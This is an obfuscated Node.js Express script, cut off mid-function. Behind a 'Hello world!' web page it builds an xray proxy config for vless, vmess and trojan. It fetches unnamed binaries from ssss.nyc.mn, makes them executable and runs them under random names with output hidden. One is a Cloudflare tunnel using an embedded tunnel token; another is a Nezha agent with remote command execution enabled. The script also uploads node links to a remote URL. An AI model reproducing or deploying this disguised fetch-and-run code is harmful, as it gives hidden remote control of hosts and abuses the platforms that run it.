const _0x3259f0=_0x48a0;(function(_0x57ba73,_0x2698dd){const _0x18377b={_0x5a0ae5:0xc0,_0x5803ac:0xdd,_0x5dfd05:0xf6,_0x3b5abd:0x147,_0xbf9a59:0xdb},_0x4e69e7=_0x48a0,_0x520293=_0x57ba73();while(!![]){try{const _0x1206d5=-parseInt(_0x4e69e7(_0x18377b._0x5a0ae5))/0x1+parseInt(_0x4e69e7(_0x18377b._0x5803ac))/0x2*(-parseInt(_0x4e69e7(0x11a))/0x3)+-parseInt(_0x4e69e7(0x92))/0x4*(-parseInt(_0x4e69e7(_0x18377b._0x5dfd05))/0x5)+parseInt(_0x4e69e7(0xfd))/0x6*(-parseInt(_0x4e69e7(0x97))/0x7)+-parseInt(_0x4e69e7(_0x18377b._0x3b5abd))/0x8*(-parseInt(_0x4e69e7(_0x18377b._0xbf9a59))/0x9)+-parseInt(_0x4e69e7(0xd3))/0xa+parseInt(_0x4e69e7(0xf0))/0xb;if(_0x1206d5===_0x2698dd)break;else _0x520293['push'](_0x520293['shift']());}catch(_0x535806){_0x520293['push'](_0x520293['shift']());}}}(_0x1a0d,0x1ed27));const express=require(_0x3259f0(0x111)),app=express(),axios=require(_0x3259f0(0x14c)),os=require('os'),fs=require('fs'),path=require(_0x3259f0(0xe6)),{promisify}=require(_0x3259f0(0xeb)),exec=promisify(require(_0x3259f0(0xd7))[_0x3259f0(0x12b)]),{execSync}=require(_0x3259f0(0xd7)),UPLOAD_URL=process['env'][_0x3259f0(0x144)]||'',PROJECT_URL=process[_0x3259f0(0xac)][_0x3259f0(0x133)]||'',AUTO_ACCESS=process[_0x3259f0(0xac)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3259f0(0xac)][_0x3259f0(0xe5)]||'./tmp',SUB_PATH=process[_0x3259f0(0xac)]['SUB_PATH']||_0x3259f0(0x154),PORT=process[_0x3259f0(0xac)][_0x3259f0(0xd5)]||process['env'][_0x3259f0(0xe7)]||0xbb8,UUID=process['env'][_0x3259f0(0xa1)]||'ca545db2-979c-4ea1-9e5f-d72ea6c33b61',NEZHA_SERVER=process['env'][_0x3259f0(0x116)]||'',NEZHA_PORT=process['env'][_0x3259f0(0x110)]||'',NEZHA_KEY=process['env'][_0x3259f0(0x135)]||'',ARGO_DOMAIN=process['env'][_0x3259f0(0xe8)]||_0x3259f0(0xd1),ARGO_AUTH=process[_0x3259f0(0xac)][_0x3259f0(0x117)]||_0x3259f0(0x10c),ARGO_PORT=process[_0x3259f0(0xac)][_0x3259f0(0xcf)]||_0x3259f0(0xb8),CFIP=process[_0x3259f0(0xac)]['CFIP']||_0x3259f0(0xec),CFPORT=process[_0x3259f0(0xac)][_0x3259f0(0xef)]||0x20fb,NAME=process[_0x3259f0(0xac)][_0x3259f0(0xbc)]||_0x3259f0(0x146);!fs['existsSync'](FILE_PATH)?(fs[_0x3259f0(0x143)](FILE_PATH),console[_0x3259f0(0xa0)](FILE_PATH+'\x20is\x20created')):console[_0x3259f0(0xa0)](FILE_PATH+_0x3259f0(0xf2));function generateRandomName(){const _0x1168c2={_0x5a2b24:0x12d},_0x3b9cf7=_0x3259f0,_0x51e258=_0x3b9cf7(0x9a);let _0x2277ad='';for(let _0x3be608=0x0;_0x3be608<0x6;_0x3be608++){_0x2277ad+=_0x51e258[_0x3b9cf7(_0x1168c2._0x5a2b24)](Math[_0x3b9cf7(0x8f)](Math['random']()*_0x51e258[_0x3b9cf7(0x103)]));}return _0x2277ad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3259f0(0x94)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3259f0(0x94)](FILE_PATH,botName),subPath=path[_0x3259f0(0x94)](FILE_PATH,_0x3259f0(0xd9)),listPath=path['join'](FILE_PATH,_0x3259f0(0xc7)),bootLogPath=path[_0x3259f0(0x94)](FILE_PATH,_0x3259f0(0xfe)),configPath=path[_0x3259f0(0x94)](FILE_PATH,_0x3259f0(0xa6));function deleteNodes(){const _0x416660={_0x1bd9ce:0xb4,_0x216ced:0xc5,_0x849275:0x121,_0x21ec05:0x103,_0x5ec0bf:0xc2},_0x541791=_0x3259f0;try{if(!UPLOAD_URL)return;if(!fs[_0x541791(_0x416660._0x1bd9ce)](subPath))return;let _0x2aef9d;try{_0x2aef9d=fs['readFileSync'](subPath,_0x541791(_0x416660._0x216ced));}catch{return null;}const _0x3e4907=Buffer[_0x541791(_0x416660._0x849275)](_0x2aef9d,_0x541791(0xb3))[_0x541791(0xfa)]('utf-8'),_0x47f09e=_0x3e4907[_0x541791(0xff)]('\x0a')['filter'](_0x46b5c3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x541791(0x14f)](_0x46b5c3));if(_0x47f09e[_0x541791(_0x416660._0x21ec05)]===0x0)return;return axios[_0x541791(_0x416660._0x5ec0bf)](UPLOAD_URL+_0x541791(0xe3),JSON[_0x541791(0x101)]({'nodes':_0x47f09e}),{'headers':{'Content-Type':'application/json'}})[_0x541791(0x132)](_0x227e10=>{return null;}),null;}catch(_0x58db7b){return null;}}function _0x1a0d(){const _0x18ad81=['Empowerment\x20success\x20for\x20','tcp','base64','existsSync','App\x20is\x20running','org','\x20failed:\x20','9097','amd','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Subscription\x20uploaded\x20successfully','NAME','application/json','block','\x0a\x0avmess://','227245NsHRiM','Error\x20executing\x20command:\x20','post','http','taskkill\x20/f\x20/im\x20','utf-8','vless','list.txt','country_code','NEZHA\x20variable\x20is\x20empty,skip\x20running','del\x20/f\x20/q\x20','\x20-s\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Error\x20downloading\x20files:','substring','ARGO_PORT','blackhole','karl.kenc7c.us.kg','Error\x20in\x20startserver:','2506550OMgLHI','/tunnel.yml\x20run','SERVER_PORT','\x0a\x0atrojan://','child_process','?security=tls&sni=','sub.txt','readFileSync','30573iFXXPN','2053','126938sTamAZ','\x20>/dev/null\x202>&1','\x0a\x20\x20tunnel:\x20','Hello\x20world!','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','/api/delete-nodes','error','FILE_PATH','path','PORT','ARGO_DOMAIN','\x22\x20>\x20/dev/null\x202>&1','isFile','util','162.159.153.90','text/plain;\x20charset=utf-8','npm\x20running\x20error:\x20','CFPORT','3689488XHZLMq','pkill\x20-f\x20\x22[','\x20already\x20exists','arm64','\x20successfully','false','95eisdnm','close','basename','\x0a\x20\x20\x20\x20','toString','writeFileSync','Add\x20automatic\x20access\x20task\x20faild:\x20','418998sQIArl','boot.log','split','/vmess-argo','stringify','\x20-p\x20','length','?encryption=none&security=tls&sni=','\x0avless://','arm','all','success','config.yaml','pop','has','eyJhIjoiZGNhYjU2ZDkyYjBlYzdlNTU2ODdkMWI5YWRhMTkzOTYiLCJ0IjoiY2JhM2FmN2MtOTI3YS00Nzg1LWEzM2EtMjgyMjJkN2ZhNzI0IiwicyI6IlpqWTBPR1UxWkdZdFltVmlaQzAwTTJKbUxXSmhabVF0WkRCaE1qRTFaVEZoTURSbCJ9','\x20-c\x20\x22','&fp=firefox&type=ws&host=','http\x20server\x20is\x20running\x20on\x20port:','NEZHA_PORT','express','automatic\x20access\x20task\x20added\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/bot','NEZHA_SERVER','ARGO_AUTH','https://amd64.ssss.nyc.mn/web','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','3mlSbHh','\x20>/dev/null\x202>&1\x20&','chmod','php\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','forEach','Skipping\x20adding\x20automatic\x20access\x20task','from','unlinkSync','fileUrl','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2087','2096','ArgoDomain:','Unknown','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://oooo.serv00.net/add-url','exec','https://arm64.ssss.nyc.mn/web','charAt','readdirSync','win32','platform','map','catch','PROJECT_URL','fileName','NEZHA_KEY','unshift','nohup\x20','/vless-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/trojan-argo','2083','true','\x0aclient_secret:\x20','pipe','firefox','status','createWriteStream','message','mkdirSync','UPLOAD_URL','response','karlo','416ZnCZgn','Download\x20','send','freedom','none','axios','rm\x20-rf\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://arm64.ssss.nyc.mn/v1','/api/add-subscriptions','listen','lwy','/api/add-nodes','includes','get','tls','floor','quic','stream','47452BhZwRi','https://arm64.ssss.nyc.mn/agent','join','clear','TunnelSecret','7qnWCYO','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','aarch64','abcdefghijklmnopqrstuvwxyz','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','127.0.0.1','tunnel.yml','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','log','UUID','ARGO_DOMAIN:','/vmess-argo?ed=2560','countryCode','data','config.json','xtls-rprx-vision','match','push','https://ipapi.co/json/','443','env','\x20is\x20running','8443','--tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture'];_0x1a0d=function(){return _0x18ad81;};return _0x1a0d();}function cleanupOldFiles(){const _0x3665cb={_0x1e3c24:0x12e,_0x3e9830:0x11f},_0x349bbd=_0x3259f0;try{const _0x4cfd83=fs[_0x349bbd(_0x3665cb._0x1e3c24)](FILE_PATH);_0x4cfd83[_0x349bbd(_0x3665cb._0x3e9830)](_0x43c36d=>{const _0x9fca67=_0x349bbd,_0x2df6e8=path[_0x9fca67(0x94)](FILE_PATH,_0x43c36d);try{const _0x4d4cad=fs['statSync'](_0x2df6e8);_0x4d4cad[_0x9fca67(0xea)]()&&fs['unlinkSync'](_0x2df6e8);}catch(_0x2e5fa3){}});}catch(_0x36d63b){}}app['get']('/',function(_0x2bcf90,_0x4f032f){const _0x2b8db7={_0x2be5b9:0x149},_0x3fdb9e=_0x3259f0;_0x4f032f[_0x3fdb9e(_0x2b8db7._0x2be5b9)](_0x3fdb9e(0xe0));});async function generateConfig(){const _0x15fdaf={_0x1408de:0x9c,_0x38e644:0x14b,_0x2e676b:0xc6,_0x17ea28:0xa7,_0xd7e353:0x100,_0x490ea5:0xc6,_0x2e1b08:0x9d,_0x5962da:0xc6,_0x39c9e4:0x8e,_0x2213d8:0xc3,_0x3029c3:0x9d,_0x2cc30d:0x13a,_0x27f01b:0xc3,_0x405e4c:0xd0,_0x4a7aae:0xbe,_0x27810c:0x101},_0x2b2ca8=_0x3259f0,_0x1fbe01={'log':{'access':_0x2b2ca8(0x9c),'error':_0x2b2ca8(_0x15fdaf._0x1408de),'loglevel':_0x2b2ca8(_0x15fdaf._0x38e644)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b2ca8(_0x15fdaf._0x2e676b),'settings':{'clients':[{'id':UUID,'flow':_0x2b2ca8(_0x15fdaf._0x17ea28)}],'decryption':_0x2b2ca8(_0x15fdaf._0x38e644),'fallbacks':[{'dest':0xbb9},{'path':_0x2b2ca8(0x138),'dest':0xbba},{'path':_0x2b2ca8(_0x15fdaf._0xd7e353),'dest':0xbbb},{'path':_0x2b2ca8(0x13a),'dest':0xbbc}]},'streamSettings':{'network':_0x2b2ca8(0xb2)}},{'port':0xbb9,'listen':_0x2b2ca8(0x9d),'protocol':_0x2b2ca8(_0x15fdaf._0x490ea5),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x2b2ca8(_0x15fdaf._0x2e1b08),'protocol':_0x2b2ca8(_0x15fdaf._0x5962da),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2b2ca8(0x138)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b2ca8(0xc3),_0x2b2ca8(_0x15fdaf._0x39c9e4),_0x2b2ca8(0x90)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2b2ca8(0x9d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2b2ca8(_0x15fdaf._0x2213d8),_0x2b2ca8(0x8e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2b2ca8(_0x15fdaf._0x3029c3),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2b2ca8(_0x15fdaf._0x38e644),'wsSettings':{'path':_0x2b2ca8(_0x15fdaf._0x2cc30d)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b2ca8(_0x15fdaf._0x27f01b),_0x2b2ca8(0x8e),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2b2ca8(0x14a),'tag':'direct'},{'protocol':_0x2b2ca8(_0x15fdaf._0x405e4c),'tag':_0x2b2ca8(_0x15fdaf._0x4a7aae)}]};fs['writeFileSync'](path[_0x2b2ca8(0x94)](FILE_PATH,_0x2b2ca8(0xa6)),JSON[_0x2b2ca8(_0x15fdaf._0x27810c)](_0x1fbe01,null,0x2));}function getSystemArchitecture(){const _0x126b79={_0xb8091c:0x106},_0x1da04f=_0x3259f0,_0x59f0e9=os['arch']();return _0x59f0e9===_0x1da04f(_0x126b79._0xb8091c)||_0x59f0e9===_0x1da04f(0xf3)||_0x59f0e9===_0x1da04f(0x99)?'arm':_0x1da04f(0xb9);}function downloadFile(_0x541efd,_0x44d7b1,_0x1f8267){const _0x52d210={_0x42be9d:0x143},_0x26eaf1={_0x17083e:0xb7},_0x2b8467={_0xeae0ef:0xa5,_0x527f8d:0x13e},_0x39d9ad=_0x3259f0,_0x1a845b=_0x541efd;!fs[_0x39d9ad(0xb4)](FILE_PATH)&&fs[_0x39d9ad(_0x52d210._0x42be9d)](FILE_PATH,{'recursive':!![]});const _0x2394a2=fs[_0x39d9ad(0x141)](_0x1a845b);axios({'method':'get','url':_0x44d7b1,'responseType':_0x39d9ad(0x91)})['then'](_0x2f2b89=>{const _0x441f98=_0x39d9ad;_0x2f2b89[_0x441f98(_0x2b8467._0xeae0ef)][_0x441f98(_0x2b8467._0x527f8d)](_0x2394a2),_0x2394a2['on']('finish',()=>{const _0x209c03=_0x441f98;_0x2394a2[_0x209c03(0xf7)](),console[_0x209c03(0xa0)](_0x209c03(0x148)+path[_0x209c03(0xf8)](_0x1a845b)+_0x209c03(0xf4)),_0x1f8267(null,_0x1a845b);}),_0x2394a2['on']('error',_0x3431c9=>{const _0x5a1beb=_0x441f98;fs['unlink'](_0x1a845b,()=>{});const _0x2cfe7e=_0x5a1beb(0x148)+path[_0x5a1beb(0xf8)](_0x1a845b)+_0x5a1beb(0xb7)+_0x3431c9[_0x5a1beb(0x142)];console['error'](_0x2cfe7e),_0x1f8267(_0x2cfe7e);});})['catch'](_0x2bf468=>{const _0xcc381=_0x39d9ad,_0x35f71c='Download\x20'+path[_0xcc381(0xf8)](_0x1a845b)+_0xcc381(_0x26eaf1._0x17083e)+_0x2bf468[_0xcc381(0x142)];console['error'](_0x35f71c),_0x1f8267(_0x35f71c);});}async function downloadFilesAndRun(){const _0x43784e={_0x3b75a0:0x103,_0x512a6c:0xa0,_0x41c3f7:0x131,_0x5bf10a:0x8c,_0x23e61b:0x10a,_0x3ffb86:0xab,_0x1d240a:0xae,_0x40a3c0:0x126,_0x545133:0x125,_0x2f70db:0x13b,_0x21c3e1:0xf5,_0x39802a:0x13d,_0x3ac094:0x113,_0x2c9ffa:0x9b,_0x31da63:0xfb,_0x25e830:0xad,_0x1d2f83:0x11d,_0x3a2abf:0x125,_0x1890aa:0xdc,_0x4b1389:0xcb,_0x371872:0xee,_0x164d8f:0xc9,_0x544a19:0xa0,_0x2cc0d9:0xa8,_0x10fbb6:0xe4},_0x3fa3ff={_0x20648b:0x123},_0x37fb5a=_0x3259f0,_0x323103=getSystemArchitecture(),_0x18cc9d=getFilesForArchitecture(_0x323103);if(_0x18cc9d[_0x37fb5a(_0x43784e._0x3b75a0)]===0x0){console[_0x37fb5a(_0x43784e._0x512a6c)](_0x37fb5a(0xb0));return;}const _0x7c7fb6=_0x18cc9d[_0x37fb5a(_0x43784e._0x41c3f7)](_0x3320dd=>{return new Promise((_0x5dfb52,_0x14b9f4)=>{const _0x50be7a=_0x48a0;downloadFile(_0x3320dd[_0x50be7a(0x134)],_0x3320dd[_0x50be7a(_0x3fa3ff._0x20648b)],(_0x49ba18,_0x53ffc0)=>{_0x49ba18?_0x14b9f4(_0x49ba18):_0x5dfb52(_0x53ffc0);});});});try{await Promise[_0x37fb5a(0x107)](_0x7c7fb6);}catch(_0x27f30e){console[_0x37fb5a(0xe4)](_0x37fb5a(0xcd),_0x27f30e);return;}function _0x52476b(_0x41713d){const _0x4770c1=_0x37fb5a,_0x5e2379=0x1fd;_0x41713d[_0x4770c1(0x11f)](_0x4b9810=>{const _0x5de0f9={_0x1aa867:0xe4,_0x118a71:0xa0},_0x2afdad=_0x4770c1;fs[_0x2afdad(0xb4)](_0x4b9810)&&fs[_0x2afdad(0x11c)](_0x4b9810,_0x5e2379,_0x51d12a=>{const _0x2b32a2=_0x2afdad;_0x51d12a?console[_0x2b32a2(_0x5de0f9._0x1aa867)]('Empowerment\x20failed\x20for\x20'+_0x4b9810+':\x20'+_0x51d12a):console[_0x2b32a2(_0x5de0f9._0x118a71)](_0x2b32a2(0xb1)+_0x4b9810+':\x20'+_0x5e2379['toString'](0x8));});});}const _0x2426b3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x52476b(_0x2426b3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf7ec60=NEZHA_SERVER[_0x37fb5a(_0x43784e._0x5bf10a)](':')?NEZHA_SERVER[_0x37fb5a(0xff)](':')[_0x37fb5a(_0x43784e._0x23e61b)]():'',_0x5f131c=new Set([_0x37fb5a(_0x43784e._0x3ffb86),_0x37fb5a(_0x43784e._0x1d240a),_0x37fb5a(_0x43784e._0x40a3c0),_0x37fb5a(_0x43784e._0x545133),_0x37fb5a(_0x43784e._0x2f70db),'2053']),_0x1baebf=_0x5f131c[_0x37fb5a(0x10b)](_0xf7ec60)?_0x37fb5a(0x13c):_0x37fb5a(_0x43784e._0x21c3e1),_0xc14b65=_0x37fb5a(_0x43784e._0x39802a)+NEZHA_KEY+_0x37fb5a(0x14e)+NEZHA_SERVER+_0x37fb5a(_0x43784e._0x3ac094)+_0x1baebf+_0x37fb5a(_0x43784e._0x2c9ffa)+UUID;fs[_0x37fb5a(_0x43784e._0x31da63)](path[_0x37fb5a(0x94)](FILE_PATH,_0x37fb5a(0x109)),_0xc14b65);const _0x13ec9c=_0x37fb5a(0x137)+phpPath+_0x37fb5a(0x10d)+FILE_PATH+_0x37fb5a(0x11e);try{await exec(_0x13ec9c),console[_0x37fb5a(0xa0)](phpName+_0x37fb5a(_0x43784e._0x25e830)),await new Promise(_0x16b119=>setTimeout(_0x16b119,0x3e8));}catch(_0x591015){console['error'](_0x37fb5a(_0x43784e._0x1d2f83)+_0x591015);}}else{let _0x11a07e='';const _0x122895=[_0x37fb5a(_0x43784e._0x3ffb86),_0x37fb5a(0xae),_0x37fb5a(0x126),_0x37fb5a(_0x43784e._0x3a2abf),'2083',_0x37fb5a(_0x43784e._0x1890aa)];_0x122895['includes'](NEZHA_PORT)&&(_0x11a07e=_0x37fb5a(0xaf));const _0x2afe2a='nohup\x20'+npmPath+_0x37fb5a(_0x43784e._0x4b1389)+NEZHA_SERVER+':'+NEZHA_PORT+_0x37fb5a(0x102)+NEZHA_KEY+'\x20'+_0x11a07e+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2afe2a),console[_0x37fb5a(0xa0)](npmName+_0x37fb5a(0xad)),await new Promise(_0x2884b9=>setTimeout(_0x2884b9,0x3e8));}catch(_0x3ac967){console[_0x37fb5a(0xe4)](_0x37fb5a(_0x43784e._0x371872)+_0x3ac967);}}}else console[_0x37fb5a(0xa0)](_0x37fb5a(_0x43784e._0x164d8f));const _0x457418=_0x37fb5a(0x137)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x457418),console[_0x37fb5a(_0x43784e._0x544a19)](webName+_0x37fb5a(0xad)),await new Promise(_0x35e136=>setTimeout(_0x35e136,0x3e8));}catch(_0x3dfbc2){console[_0x37fb5a(0xe4)]('web\x20running\x20error:\x20'+_0x3dfbc2);}if(fs[_0x37fb5a(0xb4)](botPath)){let _0x3abd34;if(ARGO_AUTH[_0x37fb5a(_0x43784e._0x2cc0d9)](/^[A-Z0-9a-z=]{120,250}$/))_0x3abd34=_0x37fb5a(0x129)+ARGO_AUTH;else ARGO_AUTH[_0x37fb5a(0xa8)](/TunnelSecret/)?_0x3abd34=_0x37fb5a(0xba)+FILE_PATH+_0x37fb5a(0xd4):_0x3abd34=_0x37fb5a(0x150)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x37fb5a(0x137)+botPath+'\x20'+_0x3abd34+'\x20>/dev/null\x202>&1\x20&'),console[_0x37fb5a(_0x43784e._0x512a6c)](botName+_0x37fb5a(0xad)),await new Promise(_0x4522da=>setTimeout(_0x4522da,0x7d0));}catch(_0x1b0409){console[_0x37fb5a(_0x43784e._0x10fbb6)](_0x37fb5a(0xc1)+_0x1b0409);}}await new Promise(_0x265d67=>setTimeout(_0x265d67,0x1388));}function getFilesForArchitecture(_0x551e15){const _0x59f421={_0x56e699:0x12c,_0xd3c8a4:0x118,_0x2af694:0x93,_0x4f2129:0xe2,_0x38157b:0x136},_0x4a132d=_0x3259f0;let _0xca747b;_0x551e15===_0x4a132d(0x106)?_0xca747b=[{'fileName':webPath,'fileUrl':_0x4a132d(_0x59f421._0x56e699)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0xca747b=[{'fileName':webPath,'fileUrl':_0x4a132d(_0x59f421._0xd3c8a4)},{'fileName':botPath,'fileUrl':_0x4a132d(0x115)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x54acf6=_0x551e15===_0x4a132d(0x106)?_0x4a132d(_0x59f421._0x2af694):'https://amd64.ssss.nyc.mn/agent';_0xca747b['unshift']({'fileName':npmPath,'fileUrl':_0x54acf6});}else{const _0x26449d=_0x551e15==='arm'?_0x4a132d(0x151):_0x4a132d(_0x59f421._0x4f2129);_0xca747b[_0x4a132d(_0x59f421._0x38157b)]({'fileName':phpPath,'fileUrl':_0x26449d});}}return _0xca747b;}function argoType(){const _0x435e04={_0x4de180:0x139,_0x251a14:0x96,_0x4403fe:0xdf,_0x5149a6:0xe1,_0x4a3c30:0xcc,_0x13cb00:0x9e,_0x1a27e2:0x9f},_0x583c8d=_0x3259f0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x583c8d(0xa0)](_0x583c8d(_0x435e04._0x4de180));return;}if(ARGO_AUTH[_0x583c8d(0x8c)](_0x583c8d(_0x435e04._0x251a14))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1b4452=_0x583c8d(_0x435e04._0x4403fe)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x583c8d(_0x435e04._0x5149a6)+ARGO_PORT+_0x583c8d(_0x435e04._0x4a3c30);fs['writeFileSync'](path['join'](FILE_PATH,_0x583c8d(_0x435e04._0x13cb00)),_0x1b4452);}else console['log'](_0x583c8d(_0x435e04._0x1a27e2));}async function extractDomains(){const _0x3c9ffa={_0x3157b4:0xa0,_0x3dfc8b:0xda,_0xf9ca79:0xc5,_0x128d2b:0x103,_0x52904c:0xa0,_0x27986c:0x98,_0x31c03f:0x122,_0x50f152:0x124,_0x2c2272:0x137,_0x226969:0xe4,_0x55e6f4:0xe4},_0x5bb16d={_0x220a35:0xaa,_0x534190:0xa5,_0x21243f:0xc8,_0x175d8c:0xa5,_0xec7635:0x140,_0x4f6fc0:0xa4,_0x3f11d5:0xa5,_0x5d796f:0x128},_0x9ea666={_0x5de615:0x130,_0x2ac5f1:0x12f,_0x4e2abd:0xc4,_0x126c3a:0xce},_0x2dfd39=_0x3259f0;let _0x486c64;if(ARGO_AUTH&&ARGO_DOMAIN)_0x486c64=ARGO_DOMAIN,console[_0x2dfd39(_0x3c9ffa._0x3157b4)](_0x2dfd39(0xa2),_0x486c64),await _0x90e4db(_0x486c64);else try{const _0x9dfc8=fs[_0x2dfd39(_0x3c9ffa._0x3dfc8b)](path[_0x2dfd39(0x94)](FILE_PATH,_0x2dfd39(0xfe)),_0x2dfd39(_0x3c9ffa._0xf9ca79)),_0x3aa97d=_0x9dfc8[_0x2dfd39(0xff)]('\x0a'),_0x3ce8b9=[];_0x3aa97d[_0x2dfd39(0x11f)](_0xa1e468=>{const _0x28321c=_0x2dfd39,_0x27450b=_0xa1e468[_0x28321c(0xa8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x27450b){const _0x559c99=_0x27450b[0x1];_0x3ce8b9['push'](_0x559c99);}});if(_0x3ce8b9[_0x2dfd39(_0x3c9ffa._0x128d2b)]>0x0)_0x486c64=_0x3ce8b9[0x0],console[_0x2dfd39(_0x3c9ffa._0x52904c)](_0x2dfd39(0x127),_0x486c64),await _0x90e4db(_0x486c64);else{console[_0x2dfd39(_0x3c9ffa._0x52904c)](_0x2dfd39(_0x3c9ffa._0x27986c)),fs[_0x2dfd39(_0x3c9ffa._0x31c03f)](path[_0x2dfd39(0x94)](FILE_PATH,_0x2dfd39(0xfe)));async function _0x1d35e8(){const _0xe7f2cc=_0x2dfd39;try{process[_0xe7f2cc(_0x9ea666._0x5de615)]===_0xe7f2cc(_0x9ea666._0x2ac5f1)?await exec(_0xe7f2cc(_0x9ea666._0x4e2abd)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xe7f2cc(0xf1)+botName['charAt'](0x0)+']'+botName[_0xe7f2cc(_0x9ea666._0x126c3a)](0x1)+_0xe7f2cc(0xe9));}catch(_0x42dc47){}}_0x1d35e8(),await new Promise(_0x70205d=>setTimeout(_0x70205d,0xbb8));const _0x14c090='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2dfd39(_0x3c9ffa._0x50f152)+ARGO_PORT;try{await exec(_0x2dfd39(_0x3c9ffa._0x2c2272)+botPath+'\x20'+_0x14c090+_0x2dfd39(0x11b)),console['log'](botName+_0x2dfd39(0xad)),await new Promise(_0x3a6745=>setTimeout(_0x3a6745,0xbb8)),await extractDomains();}catch(_0x11cf9f){console[_0x2dfd39(_0x3c9ffa._0x226969)](_0x2dfd39(0xc1)+_0x11cf9f);}}}catch(_0x482243){console[_0x2dfd39(_0x3c9ffa._0x55e6f4)]('Error\x20reading\x20boot.log:',_0x482243);}async function _0x31d674(){const _0x3a6282=_0x2dfd39;try{const _0x38690e=await axios['get'](_0x3a6282(_0x5bb16d._0x220a35),{'timeout':0xbb8});if(_0x38690e[_0x3a6282(_0x5bb16d._0x534190)]&&_0x38690e[_0x3a6282(_0x5bb16d._0x534190)][_0x3a6282(_0x5bb16d._0x21243f)]&&_0x38690e[_0x3a6282(0xa5)][_0x3a6282(0xb6)])return _0x38690e[_0x3a6282(_0x5bb16d._0x534190)][_0x3a6282(0xc8)]+'_'+_0x38690e[_0x3a6282(0xa5)][_0x3a6282(0xb6)];}catch(_0x1b2de9){try{const _0x57a19e=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x57a19e[_0x3a6282(_0x5bb16d._0x534190)]&&_0x57a19e[_0x3a6282(_0x5bb16d._0x175d8c)][_0x3a6282(_0x5bb16d._0xec7635)]===_0x3a6282(0x108)&&_0x57a19e['data'][_0x3a6282(_0x5bb16d._0x4f6fc0)]&&_0x57a19e[_0x3a6282(0xa5)]['org'])return _0x57a19e[_0x3a6282(_0x5bb16d._0x3f11d5)]['countryCode']+'_'+_0x57a19e[_0x3a6282(0xa5)][_0x3a6282(0xb6)];}catch(_0x4d05d3){}}return _0x3a6282(_0x5bb16d._0x5d796f);}async function _0x90e4db(_0xa807c0){const _0x1140ef=await 